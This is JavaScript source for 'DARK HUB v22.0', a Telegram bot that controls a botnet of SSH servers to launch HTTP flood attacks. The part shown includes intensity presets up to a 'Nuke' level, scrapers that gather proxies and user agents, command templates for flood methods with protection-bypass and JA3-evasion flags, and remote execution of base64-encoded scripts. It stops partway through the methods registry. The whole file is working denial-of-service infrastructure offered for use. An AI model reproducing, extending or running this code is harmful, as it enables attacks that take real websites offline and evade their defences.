/**
 * DARK HUB v22.0 — Modern Rebuild
 *
 * v22.0 vs v21.3:
 *  - FIX: 409 webhook loop — deleteWebhook once at startup, exponential backoff
 *  - FIX: Method parse fallback, conn leak, timer leak
 *  - NEW: /ping /uptime /favorites /top /schedule /queue
 *  - NEW: Per-method rate limit (minCooldown per method)
 *  - NEW: Proxy/UA auto-refresh scheduler (6h default)
 *  - NEW: Bulk server ops, server tags
 *  - NEW: Attack progress bar
 *  - NEW: Auto-retry transient failure
 *  - UI:  Modern menus, cleaner sections, better pagination
 */

'use strict';

require('events').EventEmitter.defaultMaxListeners = 100;
process.setMaxListeners(100);

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const EventEmitter = require('events');
const net = require('net');

const TGModule = require('node-telegram-bot-api');
const TelegramBot = TGModule.default || TGModule;
const { Client } = require('ssh2');
const axios = require('axios');

const BRAND = 'DARK HUB';
const VERSION = 'v22.0';

/* ══════════════════════════════════════════════════════════════════════════
   INTENSITY
   ══════════════════════════════════════════════════════════════════════════ */

const INTENSITY = {
  swarm:   { emoji: '🐝', label: 'Swarm',   adminOnly: false, minCores: 0,  threads: 8,  rate: 60,  desc: 'Many small nodes · 480 RPS/node' },
  light:   { emoji: '🟢', label: 'Light',   adminOnly: false, minCores: 0,  threads: 4,  rate: 60,  desc: 'Low profile · 240 RPS/node' },
  medium:  { emoji: '🟡', label: 'Medium',  adminOnly: false, minCores: 0,  threads: 8,  rate: 90,  desc: 'Balanced · 720 RPS/node' },
  heavy:   { emoji: '🟠', label: 'Heavy',   adminOnly: false, minCores: 0,  threads: 16, rate: 90,  desc: 'Aggressive · 1440 RPS/node' },
  auto:    { emoji: '🤖', label: 'Auto',    adminOnly: false, minCores: 0,
             desc: 'Per-server threads × cores · up to 48T×300R',
             calculate: (cores) => ({ threads: Math.min(48, Math.max(8, cores * 4)), rate: Math.min(300, Math.max(60, cores * 20)) }) },
  extreme: { emoji: '🔴', label: 'Extreme', adminOnly: true,  minCores: 16, threads: 32, rate: 200, desc: '16+ cores only · 6400 RPS/node' },
  nuke:    { emoji: '☢️', label: 'Nuke',    adminOnly: true,  minCores: 16, threads: 48, rate: 250, desc: '16+ cores only · 12000 RPS/node' },
};

/* ══════════════════════════════════════════════════════════════════════════
   CONSTANTS
   ══════════════════════════════════════════════════════════════════════════ */

const BUILTIN_MODULES = new Set([
  'assert','async_hooks','buffer','child_process','cluster','console','constants','crypto',
  'dgram','diagnostics_channel','dns','domain','events','fs','http','http2','https','inspector',
  'module','net','os','path','perf_hooks','process','punycode','querystring','readline','repl',
  'stream','string_decoder','sys','timers','tls','trace_events','tty','url','util','v8','vm',
  'wasi','worker_threads','zlib','assert/strict','dns/promises','fs/promises',
  'readline/promises','stream/promises','timers/promises','util/types',
]);

const PINNED_VERSIONS = {
  'yargs':'yargs@16','undici':'undici@6','chalk':'chalk@4','node-fetch':'node-fetch@2',
  'got':'got@11','p-limit':'p-limit@3','execa':'execa@5','uuid':'uuid@8',
};

const AUX_FILES = ['proxy.txt', 'ua.txt'];
const KNOWN_AUX = ['ua.txt','proxy.txt','useragents.txt','uas.txt','user_agents.txt'];

/* ══════════════════════════════════════════════════════════════════════════
   CONFIG
   ══════════════════════════════════════════════════════════════════════════ */

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  ADMIN_IDS: (process.env.ADMIN_ID || '').split(',').filter(Boolean).map(Number),
  SCRIPT_DIR: __dirname,
  DATA_DIR: path.join(__dirname, 'data'),

  DEFAULT_COOLDOWN: Number(process.env.COOLDOWN || 30),
  PROXY_FILE: 'proxy.txt',
  UA_FILE: 'ua.txt',
  REMOTE_DIR: '/root/attack',

  SSH_TIMEOUT: 20000,
  SSH_EXEC_TIMEOUT: 120000,
  HEALTH_CACHE_TTL: 120000,
  ATTACK_TIMEOUT: 25000,

  DEFAULT_THREADS: 16,
  DEFAULT_RATE: 90,

  MAX_CONCURRENT_PER_SERVER: 5,
  MAX_QUEUE: 500,
  WRITE_DEBOUNCE_MS: 250,
  METHOD_VALIDATE_TIMEOUT: 3000,

  RESUME_ON_START: true,
  MAX_POLLING_RESTARTS: 50,
  HEARTBEAT_STALE_MS: 180000,
  HEARTBEAT_CHECK_MS: 60000,
  SESSION_GC_MS: 60000,
  CONN_IDLE_MS: 600000,

  REMOTE_STABILIZE_MS: 1500,
  REMOTE_ENV_TTL: 600000,
  REMOTE_RETRY: 1,
  REMOTE_KILL_GRACE_MS: 8000,

  AUTO_PROVISION: true,
  PROVISION_TIMEOUT: 300000,
  DEPS_INSTALL_TIMEOUT: 300000,

  METHOD_RATE_WINDOW_MS: 60000,
  METHOD_RATE_LIMIT: 5,
  MAX_SCHEDULED: 50,
  SCHEDULED_MAX_DELAY_MS: 86400000,

  AUTO_REFRESH_PROXIES: process.env.AUTO_REFRESH_PROXIES === '1',
  AUTO_REFRESH_INTERVAL_MS: 6 * 3600 * 1000,
};

if (!CONFIG.BOT_TOKEN) { console.error('[fatal] BOT_TOKEN required'); process.exit(1); }
if (CONFIG.ADMIN_IDS.length === 0) { console.error('[fatal] ADMIN_ID required'); process.exit(1); }

fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const FILES = {
  users:       path.join(CONFIG.DATA_DIR, 'users.json'),
  servers:     path.join(CONFIG.DATA_DIR, 'servers.json'),
  groups:      path.join(CONFIG.DATA_DIR, 'groups.json'),
  methods:     path.join(CONFIG.DATA_DIR, 'methods.json'),
  methodstate: path.join(CONFIG.DATA_DIR, 'methodstate.json'),
  presets:     path.join(CONFIG.DATA_DIR, 'presets.json'),
  cooldowns:   path.join(CONFIG.DATA_DIR, 'cooldowns.json'),
  blacklist:   path.join(CONFIG.DATA_DIR, 'blacklist.json'),
  sessions:    path.join(CONFIG.DATA_DIR, 'sessions.json'),
  history:     path.join(CONFIG.DATA_DIR, 'history.json'),
  botstate:    path.join(CONFIG.DATA_DIR, 'botstate.json'),
  scheduled:   path.join(CONFIG.DATA_DIR, 'scheduled.json'),
  favorites:   path.join(CONFIG.DATA_DIR, 'favorites.json'),
  proxies:     path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE),
  ua:          path.join(CONFIG.SCRIPT_DIR, CONFIG.UA_FILE),
  audit:       path.join(CONFIG.DATA_DIR, 'audit.log'),
};

const DEFAULTS = {
  users:'{}',groups:'[]',servers:'[]',methods:'[]',methodstate:'{}',presets:'{}',
  cooldowns:'{}',blacklist:'[]',sessions:'{}',history:'[]',scheduled:'{}',favorites:'{}',
  botstate:'{"online":true,"maintenanceMsg":"🛠 Under maintenance.","lastToggleBy":null,"lastToggleAt":null}',
};

for (const [key, f] of Object.entries(FILES)) {
  if (['audit','proxies','ua'].includes(key)) continue;
  if (!fs.existsSync(f)) fs.writeFileSync(f, DEFAULTS[key] + '\n');
}

/* ══════════════════════════════════════════════════════════════════════════
   ATOMIC STORE
   ══════════════════════════════════════════════════════════════════════════ */

class JsonStore extends EventEmitter {
  constructor(file, fallback) {
    super();
    this.file = file; this.fallback = fallback;
    this._dirty = false; this._timer = null;
    this._cache = this._load();
    process.on('exit', () => this.flush());
    process.on('beforeExit', () => this.flush());
    process.on('SIGINT', () => this.flush());
    process.on('SIGTERM', () => this.flush());
  }
  _load() { try { return JSON.parse(fs.readFileSync(this.file, 'utf8')); } catch { return JSON.parse(JSON.stringify(this.fallback)); } }
  get() { return this._cache; }
  set(data) { this._cache = data; this._dirty = true; if (!this._timer) this._timer = setTimeout(() => this.flush(), CONFIG.WRITE_DEBOUNCE_MS); }
  mutate(fn) { const out = fn(this._cache); this.set(this._cache); return out; }
  flush() {
    if (this._timer) { clearTimeout(this._timer); this._timer = null; }
    if (!this._dirty) return;
    try {
      const tmp = this.file + '.tmp.' + process.pid;
      fs.writeFileSync(tmp, JSON.stringify(this._cache, null, 2) + '\n', { mode: 0o600 });
      fs.renameSync(tmp, this.file);
      this._dirty = false;
      this.emit('flushed');
    } catch (e) { console.error('[store] flush fail', this.file, e.message); }
  }
}

const store = {
  users:       new JsonStore(FILES.users, {}),
  servers:     new JsonStore(FILES.servers, []),
  groups:      new JsonStore(FILES.groups, []),
  methods:     new JsonStore(FILES.methods, []),
  methodstate: new JsonStore(FILES.methodstate, {}),
  presets:     new JsonStore(FILES.presets, {}),
  cooldowns:   new JsonStore(FILES.cooldowns, {}),
  blacklist:   new JsonStore(FILES.blacklist, []),
  sessions:    new JsonStore(FILES.sessions, {}),
  history:     new JsonStore(FILES.history, []),
  scheduled:   new JsonStore(FILES.scheduled, {}),
  favorites:   new JsonStore(FILES.favorites, {}),
  botstate:    new JsonStore(FILES.botstate, { online: true, maintenanceMsg: '🛠 Under maintenance.' }),
};

/* ══════════════════════════════════════════════════════════════════════════
   HELPERS
   ══════════════════════════════════════════════════════════════════════════ */

function botIsOnline() { return store.botstate.get().online !== false; }
function maintenanceMessage() { return store.botstate.get().maintenanceMsg || '🛠 Under maintenance.'; }

async function sendMaintenance(msg) {
  const text = `🛠 <b>Under Maintenance</b>\n\n<i>${esc(maintenanceMessage())}</i>`;
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML' }); } catch {}
}

function guardCommand(handler) {
  return async (msg, match) => {
    if (!botIsOnline() && !isAdmin(msg.from.id)) return sendMaintenance(msg);
    try { return await handler(msg, match); }
    catch (e) { console.error('[cmd]', e); }
  };
}

function audit(event, actor, details = {}) {
  try {
    const line = JSON.stringify({ at: new Date().toISOString(), event, actor, details }) + '\n';
    fs.appendFile(FILES.audit, line, () => {});
    const stat = fs.statSync(FILES.audit);
    if (stat.size > 10 * 1024 * 1024) {
      fs.renameSync(FILES.audit, FILES.audit + '.' + Date.now());
    }
  } catch {}
}
function tailAudit(n = 20) {
  try { return fs.readFileSync(FILES.audit, 'utf8').trim().split('\n').filter(Boolean).slice(-n); }
  catch { return []; }
}

class TokenBucket {
  constructor(capacity, refillPerSec) { this.capacity = capacity; this.tokens = capacity; this.refillPerSec = refillPerSec; this.lastRefill = Date.now(); }
  take(n = 1) {
    const now = Date.now();
    this.tokens = Math.min(this.capacity, this.tokens + ((now - this.lastRefill) / 1000) * this.refillPerSec);
    this.lastRefill = now;
    if (this.tokens >= n) { this.tokens -= n; return true; }
    return false;
  }
}
const buckets = new Map();
const getBucket = id => { if (!buckets.has(id)) buckets.set(id, new TokenBucket(5, 0.5)); return buckets.get(id); };

const methodRateMap = new Map();
function checkMethodRate(userId, methodId) {
  const key = `${userId}:${methodId}`;
  const now = Date.now();
  let arr = methodRateMap.get(key);
  if (!arr) { arr = []; methodRateMap.set(key, arr); }
  const recent = arr.filter(t => now - t < CONFIG.METHOD_RATE_WINDOW_MS);
  if (recent.length >= CONFIG.METHOD_RATE_LIMIT) {
    const waitMs = CONFIG.METHOD_RATE_WINDOW_MS - (now - recent[0]);
    return Math.ceil(waitMs / 1000);
  }
  recent.push(now);
  methodRateMap.set(key, recent);
  return 0;
}

const esc = s => String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

function normalizeHost(raw) {
  return String(raw || '').toLowerCase()
    .replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/:\d+$/, '').replace(/\.+$/, '');
}
function hostMatches(h, p) {
  h = normalizeHost(h); p = normalizeHost(p);
  if (!h || !p) return false;
  if (p.startsWith('*.')) { const b = p.slice(2); return h === b || h.endsWith('.' + b); }
  return h === p;
}
const isBlacklisted = host => store.blacklist.get().some(p => hostMatches(host, p));
const shellQuote = s => "'" + String(s).replace(/'/g, "'\\''") + "'";

function safeRemoteExec(conn, scriptLines, timeoutMs) {
  const b64 = Buffer.from(scriptLines.join('\n'), 'utf8').toString('base64');
  return sshExec(conn, `echo ${b64} | base64 -d | setsid bash -s`, timeoutMs);
}
function formatNum(n) {
  if (n >= 1000000) return (n / 1000000).toFixed(1) + 'M';
  if (n >= 1000) return (n / 1000).toFixed(1) + 'K';
  return String(n);
}
function formatBytes(b) {
  if (!b) return '0B';
  if (b >= 1048576) return (b / 1048576).toFixed(1) + 'MB';
  if (b >= 1024) return (b / 1024).toFixed(1) + 'KB';
  return b + 'B';
}
function formatGB(mb) { return mb >= 1024 ? (mb / 1024).toFixed(0) + 'G' : mb + 'M'; }
function formatDuration(ms) {
  const s = Math.floor(ms / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  const parts = [];
  if (d) parts.push(`${d}d`);
  if (h) parts.push(`${h}h`);
  if (m) parts.push(`${m}m`);
  if (sec || !parts.length) parts.push(`${sec}s`);
  return parts.join(' ');
}
function progressBar(pct, len = 10) {
  const p = Math.max(0, Math.min(100, pct));
  const filled = Math.round((p / 100) * len);
  return '█'.repeat(filled) + '░'.repeat(len - filled) + ` ${p}%`;
}

function onlineNodeCount() { return store.servers.get().filter(s => s.status === 'online').length; }

function estimateRpsFor(level, serverId = null, method = null) {
  const preset = INTENSITY[level];
  if (!preset) return null;

  if (method?.parseIntensity) {
    if (level === 'auto') {
      const targets = serverId ? [serverId] : store.servers.get().filter(s => s.status === 'online').map(s => s.id);
      let total = 0;
      for (const sid of targets) {
        const cores = getServerCores(sid) || 4;
        const int = method.parseIntensity('auto', cores);
        total += int.conn * int.streams;
      }
      return { nodeRps: null, aggregateRps: total, isAuto: true };
    }
    const int = method.parseIntensity(level, 4);
    const rps = int.conn * int.streams;
    return { nodeRps: rps, aggregateRps: rps * onlineNodeCount() };
  }

  if (level === 'auto') {
    const targets = serverId ? [serverId] : store.servers.get().filter(s => s.status === 'online').map(s => s.id);
    let total = 0;
    for (const sid of targets) {
      const cores = getServerCores(sid) || 0;
      if (!cores) continue;
      const p = preset.calculate(cores);
      total += p.threads * p.rate;
    }
    return { nodeRps: null, aggregateRps: total, isAuto: true };
  }
  const rps = preset.threads * preset.rate;
  return { nodeRps: rps, aggregateRps: rps * onlineNodeCount() };
}

/* ══════════════════════════════════════════════════════════════════════════
   AUTO DEP SCANNER
   ══════════════════════════════════════════════════════════════════════════ */

function scanMethodDeps(fileName) {
  const fp = path.join(CONFIG.SCRIPT_DIR, fileName);
  if (!fs.existsSync(fp)) return [];
  try {
    const content = fs.readFileSync(fp, 'utf8');
    const deps = new Set();
    const extractPkg = raw => {
      if (!raw) return null;
      if (raw.startsWith('node:')) return null;
      if (raw.startsWith('.') || raw.startsWith('/')) return null;
      let pkg;
      if (raw.startsWith('@')) {
        const parts = raw.split('/');
        if (parts.length < 2) return null;
        pkg = parts[0] + '/' + parts[1];
      } else { pkg = raw.split('/')[0]; }
      if (BUILTIN_MODULES.has(pkg)) return null;
      return pkg;
    };
    const re1 = /\brequire\s*\(\s*['"]([^'"]+)['"]\s*\)/g;
    let m;
    while ((m = re1.exec(content)) !== null) {
      const pkg = extractPkg(m[1]); if (pkg) deps.add(pkg);
    }
    const re2 = /\bimport\s*\(\s*['"]([^'"]+)['"]\s*\)/g;
    while ((m = re2.exec(content)) !== null) {
      const pkg = extractPkg(m[1]); if (pkg) deps.add(pkg);
    }
    const re3 = /\bimport\s+(?:[^'"]+\s+from\s+)?['"]([^'"]+)['"]/g;
    while ((m = re3.exec(content)) !== null) {
      const pkg = extractPkg(m[1]); if (pkg) deps.add(pkg);
    }
    return [...deps].sort();
  } catch (e) { return []; }
}

function scanMethodAux(fileName) {
  const fp = path.join(CONFIG.SCRIPT_DIR, fileName);
  if (!fs.existsSync(fp)) return [];
  try {
    const content = fs.readFileSync(fp, 'utf8');
    return KNOWN_AUX.filter(aux => content.includes(`'${aux}'`) || content.includes(`"${aux}"`))
      .filter(aux => aux !== CONFIG.PROXY_FILE);
  } catch { return []; }
}

function getAllMethodDeps() {
  const all = new Set();
  for (const m of allMethods()) for (const d of scanMethodDeps(m.file)) all.add(d);
  return [...all].sort();
}
function getAllMethodAux() {
  const all = new Set();
  for (const m of allMethods()) for (const a of scanMethodAux(m.file)) all.add(a);
  return [...all].sort();
}
function pinDeps(deps) { return deps.map(d => PINNED_VERSIONS[d] || d); }
function depDisplay(d) {
  const pinned = PINNED_VERSIONS[d];
  return pinned && pinned !== d ? `${d} → ${pinned}` : d;
}

/* ══════════════════════════════════════════════════════════════════════════
   PROXIES
   ══════════════════════════════════════════════════════════════════════════ */

function readProxies() {
  if (!fs.existsSync(FILES.proxies)) return [];
  return fs.readFileSync(FILES.proxies, 'utf8').split(/\r?\n/).map(l => l.trim())
    .filter(l => /^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(l));
}
function saveProxies(list) {
  const unique = [...new Set(list)];
  fs.writeFileSync(FILES.proxies, unique.join('\n') + '\n');
  return unique.length;
}

const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
];

async function scrapeProxies() {
  const seen = new Set(readProxies());
  const initial = seen.size;
  await Promise.allSettled(PROXY_SOURCES.map(async src => {
    try {
      const r = await axios.get(src, { timeout: 12000 });
      for (const l of String(r.data).split(/\r?\n/)) {
        const t = l.trim();
        if (/^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(t)) seen.add(t);
      }
    } catch {}
  }));
  const list = [...seen];
  saveProxies(list);
  return list.length - initial;
}

async function scoreProxies(sample = 50) {
  const proxies = readProxies();
  const pick = [...proxies].sort(() => Math.random() - 0.5).slice(0, sample);
  const alive = [];
  await Promise.allSettled(pick.map(p => new Promise(res => {
    const [h, port] = p.split(':');
    const sock = net.connect({ host: h, port: Number(port) });
    const done = ok => { try { sock.destroy(); } catch {} res(ok ? alive.push(p) : null); };
    sock.setTimeout(2500);
    sock.on('connect', () => done(true));
    sock.on('timeout', () => done(false));
    sock.on('error', () => done(false));
  })));
  const dead = pick.filter(p => !alive.includes(p));
  if (dead.length > 0) {
    const current = readProxies();
    saveProxies(current.filter(p => !dead.includes(p)));
  }
  return { alive: alive.length, dead: dead.length, total: readProxies().length };
}

/* ══════════════════════════════════════════════════════════════════════════
   USER-AGENTS
   ══════════════════════════════════════════════════════════════════════════ */

function isValidUA(line) {
  const ua = String(line || '').trim();
  if (ua.length < 30 || ua.length > 500) return false;
  if (!/Mozilla|Opera|Dalvik|curl|Wget|python|Go-http|okhttp|Android|iPhone|iPad/i.test(ua)) return false;
  if (/^[-_.\s]+$/.test(ua)) return false;
  return true;
}

function readUAs() {
  if (!fs.existsSync(FILES.ua)) return [];
  return fs.readFileSync(FILES.ua, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(l => l && isValidUA(l));
}

function saveUAs(list) {
  const unique = [...new Set(list.map(s => s.trim()).filter(isValidUA))];
  fs.writeFileSync(FILES.ua, unique.join('\n') + '\n');
  return unique.length;
}

const UA_URL_SOURCES = [
  'https://raw.githubusercontent.com/intoli/user-agents/master/src/user-agents.json',
  'https://raw.githubusercontent.com/fake-useragent/fake-useragent/master/src/fake_useragent/data/browsers.jsonl',
  'https://raw.githubusercontent.com/palemoky/fake-useragent/master/user_agents.txt',
];

async function scrapeUAs() {
  const seen = new Set(readUAs());
  const initial = seen.size;
  await Promise.allSettled(UA_URL_SOURCES.map(async src => {
    try {
      const r = await axios.get(src, { timeout: 15000 });
      const body = String(r.data || '');
      if (src.endsWith('.json')) {
        try {
          const arr = JSON.parse(body);
          if (Array.isArray(arr)) {
            for (const item of arr) {
              const ua = typeof item === 'string' ? item : (item && (item.userAgent || item.user_agent || item.ua));
              if (ua && isValidUA(ua)) seen.add(ua.trim());
            }
            return;
          }
        } catch {}
      }
      if (src.endsWith('.jsonl')) {
        for (const line of body.split(/\r?\n/)) {
          try {
            const obj = JSON.parse(line);
            const ua = obj.user_agent || obj.userAgent || obj.ua;
            if (ua && isValidUA(ua)) seen.add(ua.trim());
          } catch {}
        }
        return;
      }
      for (const line of body.split(/\r?\n/)) {
        if (isValidUA(line)) seen.add(line.trim());
      }
    } catch {}
  }));
  const list = [...seen];
  saveUAs(list);
  return list.length - initial;
}

/* ══════════════════════════════════════════════════════════════════════════
   SAMPLE COMMAND PARSER
   ══════════════════════════════════════════════════════════════════════════ */

function tokenizeCommand(input) {
  const tokens = [];
  let cur = '', inQuote = null, escaped = false;
  for (const c of String(input || '')) {
    if (escaped) { cur += c; escaped = false; continue; }
    if (c === '\\') { escaped = true; continue; }
    if (inQuote) { if (c === inQuote) inQuote = null; else cur += c; }
    else if (c === '"' || c === "'") inQuote = c;
    else if (/\s/.test(c)) { if (cur) { tokens.push(cur); cur = ''; } }
    else cur += c;
  }
  if (cur) tokens.push(cur);
  return tokens;
}

const templateToString = items => items.map(t => /\s/.test(t) ? `"${t.replace(/"/g, '\\"')}"` : t).join(' ');

const VALUE_FLAGS = new Set([
  'delay','query','timeout','rate','threads','thread','duration','dur','ua','useragent',
  'user-agent','referer','referrer','cookie','cookies','path','port','amount','repeat',
  'retry','concurrent','conc','host','payload','body','header','agent','auth','token',
  'key','mode','interval','count','max','min','size','cache','type','format','content-type',
  'accept','origin','x-forwarded-for','method','workers','conns','conn','packet','pps',
  'bps','group',
]);

const isUrl = t => /^https?:\/\/\S+$/i.test(t);
const isProxy = t => /^\{proxy\}$/i.test(t) || /prox\w*\.txt$/i.test(t);
const isInt = t => /^\d+$/.test(t);
const isFlag = t => /^-{1,2}[\w-]/.test(t);
const isCombined = t => /^-[a-zA-Z]{2,}$/.test(t) && !t.startsWith('--');
const flagName = t => t.replace(/^-{1,2}/, '').split('=')[0].toLowerCase();

function parseSampleCommand(sampleStr) {
  const raw = String(sampleStr || '').trim();
  if (!raw) return { ok: false, error: 'Empty command' };
  let tokens = tokenizeCommand(raw);
  if (!tokens.length) return { ok: false, error: 'Empty command' };
  if (/^(\.{0,2}\/)?(.*\/)?node(\.exe)?$/i.test(tokens[0])) tokens.shift();
  if (tokens[0] && /\.(js|cjs|mjs|ts)$/i.test(tokens[0])) tokens.shift();
  if (!tokens.length) return { ok: false, error: 'No arguments after script name' };

  const template = [], warnings = [];
  let numSlot = 1, seenTarget = false, seenProxy = false, i = 0;

  while (i < tokens.length) {
    const t = tokens[i];
    if (isUrl(t) && !seenTarget) { template.push('$1'); seenTarget = true; numSlot = Math.max(numSlot, 2); i++; continue; }
    if (isProxy(t) && !seenProxy) { template.push('{proxy}'); seenProxy = true; i++; continue; }
    if (isFlag(t) && t.includes('=')) {
      const idx = t.indexOf('=');
      const k = t.slice(0, idx);
      let v = t.slice(idx + 1);
      if (isUrl(v) && !seenTarget) { template.push(k, '$1'); seenTarget = true; numSlot = Math.max(numSlot, 2); }
      else if (isProxy(v) && !seenProxy) { template.push(k, '{proxy}'); seenProxy = true; }
      else template.push(k, v);
      i++; continue;
    }
    if (isCombined(t)) { for (const ch of t.slice(1)) template.push('-' + ch); i++; continue; }
    if (isFlag(t)) {
      const name = flagName(t);
      const next = tokens[i + 1];
      const takesValue = VALUE_FLAGS.has(name);
      if (takesValue && next !== undefined && !isFlag(next)) {
        if (isUrl(next) && !seenTarget) { template.push(t, '$1'); seenTarget = true; numSlot = Math.max(numSlot, 2); i += 2; continue; }
        if (isProxy(next) && !seenProxy) { template.push(t, '{proxy}'); seenProxy = true; i += 2; continue; }
        template.push(t, next); i += 2; continue;
      }
      template.push(t); i++; continue;
    }
    if (isInt(t)) { if (numSlot <= 4) { template.push(`$${numSlot}`); numSlot++; } else template.push(t); i++; continue; }
    template.push(t); i++;
  }

  if (!seenTarget) return { ok: false, error: 'No target URL (http/https) found' };
  if (!seenProxy) warnings.push('No proxy.txt in sample');
  return { ok: true, template: templateToString(template), tokens: template, hasProxy: seenProxy, hasTarget: seenTarget, warnings };
}

function buildArgsFromTemplate(templateStr, target, duration, threads, rate) {
  return tokenizeCommand(templateStr).map(t => {
    if (t === '$1') return target;
    if (t === '$2') return String(duration);
    if (t === '$3') return String(threads);
    if (t === '$4') return String(rate);
    if (t === '{proxy}') return CONFIG.PROXY_FILE;
    return t;
  });
}

/* ══════════════════════════════════════════════════════════════════════════
   METHODS — PARSERS
   ══════════════════════════════════════════════════════════════════════════ */

const parseRateFirst = a => {
  const [target, duration, threads = '16', rate = '90'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(rate), String(threads), CONFIG.PROXY_FILE] };
};

const parseCrush = a => {
  const [target, duration, threads = '16', rate = '90', ...f] = a;
  const b = [target, String(duration), CONFIG.PROXY_FILE, String(threads), String(rate)];
  const flat = f.map(x => String(x).toLowerCase());
  if (flat.includes('cookies') || flat.includes('-c')) b.push('-c');
  if (flat.includes('headers') || flat.includes('-h')) b.push('-h');
  if (flat.includes('cache')   || flat.includes('-ch')) b.push('-ch', 'true');
  return { target, duration, threads, rate, args: b };
};

const parseThreadsFirst = a => {
  const [target, duration, threads = '16', rate = '90'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(threads), String(rate), CONFIG.PROXY_FILE] };
};

const parsePvHttp = a => {
  const [target, duration, threads = '50'] = a;
  const minutes = Math.max(1, Math.ceil(Number(duration) / 60));
  return { target, duration, threads, rate: 0,
    args: ['--url', target, '--time', String(minutes), '--conc', String(threads), '--adv-burst', '--adaptive-delay', '--ja3-evasion'] };
};

const parseK0ldvein = a => {
  const [target, duration, threads = '16', rate = '90', ...f] = a;
  const b = [target, String(duration), CONFIG.PROXY_FILE, String(threads), String(rate)];
  const flat = f.map(x => String(x).toLowerCase());
  if (!flat.includes('no-bypass')) b.push('-bypass');
  if (!flat.includes('no-origin') && !flat.includes('origin-only')) b.push('-origin');
  if (flat.includes('redirect')) b.push('-redirect');
  if (flat.includes('cookies') || flat.includes('c')) b.push('-c');
  if (flat.includes('silent') || flat.includes('s')) b.push('-s');
  if (flat.includes('v1')) b.push('-v', '1');
  else if (flat.includes('v2')) b.push('-v', '2');
  return { target, duration, threads, rate, args: b };
};

const parseTlsV3 = a => {
  const [target, duration, conn = '500', streams = '32', ...extras] = a;
  const args = [target, String(duration), '--conn', String(conn), '--streams', String(streams)];
  const flat = extras.map(x => String(x).toLowerCase());
  const profileIdx = flat.indexOf('--profile');
  if (profileIdx > -1 && flat[profileIdx + 1]) args.push('--profile', flat[profileIdx + 1]);
  else { const p = flat.find(x => ['chrome', 'firefox', 'safari'].includes(x)); if (p) args.push('--profile', p); }
  return { target, duration, threads: conn, rate: streams, skipThreads: true, args };
};

const parseIntensityTlsV3 = (level, cores = 4) => {
  const map = {
    swarm:   { conn: 200,  streams: 16  },
    light:   { conn: 100,  streams: 8   },
    medium:  { conn: 300,  streams: 24  },
    heavy:   { conn: 500,  streams: 32  },
    auto:    { conn: Math.min(2000, Math.max(200, cores * 50)), streams: Math.min(64, Math.max(8, cores * 2)) },
    extreme: { conn: 1000, streams: 64  },
    nuke:    { conn: 2000, streams: 128 },
  };
  return map[level] || map.heavy;
};

const parseBypassV2 = a => {
  const [target, duration, threads = '8', rate = '64', ...extras] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(threads), CONFIG.PROXY_FILE, String(rate), ...extras] };
};

const parseHHttps = a => {
  const [target, duration, rate = '32', threads = '8', ...extras] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(rate), String(threads), CONFIG.PROXY_FILE, ...extras] };
};

const parseHttpKill = a => {
  const [target, duration, threads = '8', rate = '64'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(threads), String(rate), CONFIG.PROXY_FILE] };
};

const parseGCf = a => {
  const [target, duration, threads = '8', rate = '64'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(threads), String(rate), CONFIG.PROXY_FILE] };
};

const parseH2Referer = a => {
  const [target, duration, rate = '64', threads = '8'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(rate), String(threads), CONFIG.PROXY_FILE] };
};

const parseH2Core = a => {
  const [target, duration, threads = '8', rate = '64'] = a;
  let port = 443;
  try {
    const u = new URL(target);
    port = u.port ? Number(u.port) : (u.protocol === 'https:' ? 443 : 80);
  } catch {}
  return { target, duration, threads, rate, args: [target, String(port), String(duration), String(threads), String(rate), CONFIG.PROXY_FILE] };
};

const parseH2Hybrid = a => {
  const [target, duration, threads = '8', rate = '64'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(threads), String(rate), CONFIG.PROXY_FILE] };
};

const parseCloud = a => {
  const [target, duration, threads = '8', rate = '64'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(threads), String(rate), CONFIG.PROXY_FILE] };
};

const parseHttpsBypass = a => {
  const [target, duration, rate = '64', threads = '8', ...extras] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(rate), String(threads), CONFIG.PROXY_FILE, ...extras] };
};

/* ══════════════════════════════════════════════════════════════════════════
   METHODS — REGISTRY
   ══════════════════════════════════════════════════════════════════════════ */

const BUILTIN_METHODS = [
  { id:'k0ldvein', name:'K0ldvein', file:'K0ldvein.js', builtin:true, emoji:'🩸', desc:'ArvanCloud JS bypass · flood origin', example:'/attack k0ldvein <url> <dur> [threads] [rate]', parse:parseK0ldvein },
